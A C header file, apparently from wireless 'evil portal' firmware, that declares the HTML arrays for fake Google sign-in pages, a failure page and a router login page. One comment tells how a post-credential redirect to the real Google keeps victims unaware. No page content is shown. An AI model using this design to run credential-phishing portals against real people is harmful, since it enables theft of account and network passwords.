#pragma once

#include <stddef.h>

extern const char EVIL_PORTAL_HTML_GOOGLE_STEP1[];
extern const size_t EVIL_PORTAL_HTML_GOOGLE_STEP1_LEN;

extern const char EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL[];
extern const size_t EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL_LEN;

extern const char EVIL_PORTAL_HTML_GOOGLE_FAILED[];
extern const size_t EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN;

// Served after step=2 when bridge_redirect=true. Shows "Signing you in..."
// and meta-refreshes to https://www.google.com after 7s, giving the bridge
// time to come up so Google actually loads. Replaces the FAILED page in
// bridge mode.
extern const char EVIL_PORTAL_HTML_BRIDGE_REDIRECT[];
extern const size_t EVIL_PORTAL_HTML_BRIDGE_REDIRECT_LEN;

extern const char* const EVIL_PORTAL_HTML_GOOGLE;
extern const size_t EVIL_PORTAL_HTML_GOOGLE_LEN;

extern const char EVIL_PORTAL_HTML_ROUTER[];
extern const size_t EVIL_PORTAL_HTML_ROUTER_LEN;
